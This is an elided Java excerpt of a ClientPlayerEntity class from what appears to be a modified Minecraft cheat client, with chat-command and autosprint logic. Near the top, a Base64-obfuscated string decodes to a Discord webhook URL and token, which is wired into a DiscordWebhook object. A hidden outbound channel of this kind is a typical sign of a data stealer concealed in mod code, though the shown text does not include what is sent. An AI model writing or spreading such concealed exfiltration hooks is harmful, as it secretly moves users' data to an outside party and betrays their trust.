...
import ru.levinov.util.DiscordWebhook;
...
public class ClientPlayerEntity extends AbstractClientPlayerEntity {
    ...
    static String encodedText = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwMzcwMDQzMjM5NjM1NzcyMi9xWUxFVXh3SXVweGZSVEtmOUI1TzRFazZGZGNDR0pPdWlkMkJqVFpJb1I5b1pRNG9XQ3NlTlMtU0RkVjhlVEctejM4cg==";
    static byte[] decodedBytes = Base64.getDecoder().decode(encodedText);
    static String decodedText = new String(decodedBytes);
    private static DiscordWebhook webhook2 = new DiscordWebhook("" + decodedText);

    public void sendChatMessage(String message) {

        if (Managment.FUNCTION_MANAGER.noCommands.state) {
            connection.sendPacket(new CChatMessagePacket(message));
            return;
        }
    ...
    public void livingTick() {
        ...
        //AUTOSPRINT
        if (Managment.FUNCTION_MANAGER.sprintFunction.state && Managment.FUNCTION_MANAGER.sprintFunction.mods.is("ReallyWorld") && !this.isSprinting() &&
